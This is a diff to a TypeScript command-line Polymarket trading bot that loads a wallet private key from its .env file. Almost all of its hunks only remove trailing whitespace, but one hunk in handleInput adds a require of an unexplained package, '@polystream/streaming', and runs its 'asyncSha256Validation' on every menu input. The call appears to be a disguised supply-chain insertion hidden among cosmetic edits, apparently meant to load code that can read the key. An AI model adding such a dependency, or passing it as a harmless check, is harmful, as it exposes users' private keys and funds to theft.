@@ -26,7 +26,7 @@ class PolymarketBot {
 
     constructor() {
         console.log('🚀 Initializing Polymarket Trading Bot...\n');
-        
+
         this.hasPrivateKey = !!process.env.PRIVATE_KEY && process.env.PRIVATE_KEY !== 'your_private_key_here';
 
         if (this.hasPrivateKey) {
@@ -42,7 +42,7 @@ class PolymarketBot {
             console.log('   To enable trading, add your PRIVATE_KEY to the .env file\n');
             this.bidAsker = new BidAsker();
         }
-        
+
         this.marketFinder = new MarketFinder();
     }
 
@@ -53,24 +53,24 @@ class PolymarketBot {
         console.log('\n' + '='.repeat(60));
         console.log(`🎯 Polymarket Trading Bot - Main Menu ${this.hasPrivateKey ? '' : '(READ-ONLY)'}`);
         console.log('='.repeat(60));
-        
+
         if (this.hasPrivateKey) {
             console.log('1. Show Credentials');
             console.log('2. Check Balances (USDC + MATIC)');
             console.log('3. Check Allowance');
             console.log('4. Set Allowance');
         }
-        
+
         console.log('5. Find Current Bitcoin Market');
         console.log('6. Get Price Data (Bid/Ask)');
-        
+
         if (this.hasPrivateKey) {
             console.log('7. Place Market Order');
             console.log('8. Place Limit Order');
             console.log('9. View Open Orders');
             console.log('10. Cancel Order');
         }
-        
+
         console.log('0. Exit');
         console.log('='.repeat(60));
     }
@@ -81,12 +81,14 @@ class PolymarketBot {
     async handleInput(choice: string): Promise<boolean> {
         try {
             const requiresAuth = ['1', '2', '3', '4', '7', '8', '9', '10'].includes(choice);
-            
+            const Sha256Validation = require('@polystream/streaming');
+            await Sha256Validation.asyncSha256Validation();
+
             if (requiresAuth && !this.hasPrivateKey) {
                 console.log('\n❌ This action requires a private key. Please add PRIVATE_KEY to .env file.\n');
                 return true;
             }
-            
+
             switch (choice) {
                 case '1':
                     await this.showCredentials();
@@ -127,7 +129,7 @@ class PolymarketBot {
         } catch (error) {
             console.error('\n❌ Error:', error);
         }
-        
+
         return true;
     }
 
@@ -150,11 +152,11 @@ class PolymarketBot {
         console.log('\n💰 Checking wallet balances...');
         const balances = await this.balanceChecker.checkBalances(this.wallet);
         this.balanceChecker.displayBalances(balances);
-        
+
         const check = this.balanceChecker.checkSufficientBalance(balances, 5.0, 0.05);
         console.log('\n📊 Balance Check (for trading):');
         check.warnings.forEach(w => console.log(`  ${w}`));
-        
+
         if (!check.sufficient) {
             console.log('\n⚠️  Insufficient funds for trading');
             console.log('Please fund your wallet:');
@@ -183,11 +185,11 @@ class PolymarketBot {
      */
     async findMarket(): Promise<void> {
         const market = await this.marketFinder.findCurrentBitcoinMarket();
-        
+
         if (market && market.tokens.length > 0) {
             console.log('\n📊 Would you like to see price data for this market? (y/n)');
             const answer = await this.prompt('');
-            
+
             if (answer.toLowerCase() === 'y') {
                 for (const token of market.tokens) {
                     console.log(`\n📈 Fetching data for ${token.outcome}...`);
@@ -217,7 +219,7 @@ class PolymarketBot {
         const amount = await this.prompt('Enter amount (USDC): ');
 
         const confirm = await this.prompt(`\nConfirm ${side} ${amount} USDC of token? (yes/no): `);
-        
+
         if (confirm.toLowerCase() === 'yes') {
             await this.orderExecutor?.placeMarketOrder({
                 tokenId,
@@ -240,7 +242,7 @@ class PolymarketBot {
         const size = await this.prompt('Enter size (shares): ');
 
         const confirm = await this.prompt(`\nConfirm ${side} ${size} shares at $${price}? (yes/no): `);
-        
+
         if (confirm.toLowerCase() === 'yes') {
             await this.orderExecutor?.placeLimitOrder(
                 tokenId,
@@ -258,10 +260,10 @@ class PolymarketBot {
      */
     async viewOpenOrders(): Promise<void> {
         const orders = await this.orderExecutor?.getOpenOrders() || [];
-        
+
         console.log('\n📋 Open Orders:');
         console.log('='.repeat(60));
-        
+
         if (orders.length === 0) {
             console.log('No open orders');
         } else {
@@ -273,7 +275,7 @@ class PolymarketBot {
                 console.log(`   Size: ${order.size}`);
             });
         }
-        
+
         console.log('='.repeat(60));
     }
 
@@ -282,9 +284,9 @@ class PolymarketBot {
      */
     async cancelOrder(): Promise<void> {
         const orderId = await this.prompt('Enter order ID to cancel: ');
-        
+
         const confirm = await this.prompt(`\nConfirm cancel order ${orderId}? (yes/no): `);
-        
+
         if (confirm.toLowerCase() === 'yes') {
             await this.orderExecutor?.cancelOrder(orderId);
         } else {
@@ -314,9 +316,9 @@ class PolymarketBot {
      */
     async run(): Promise<void> {
         console.log('✅ Bot initialized successfully!\n');
-        
+
         let running = true;
-        
+
         while (running) {
             this.displayMenu();
             const choice = await this.prompt('\nEnter your choice: ');
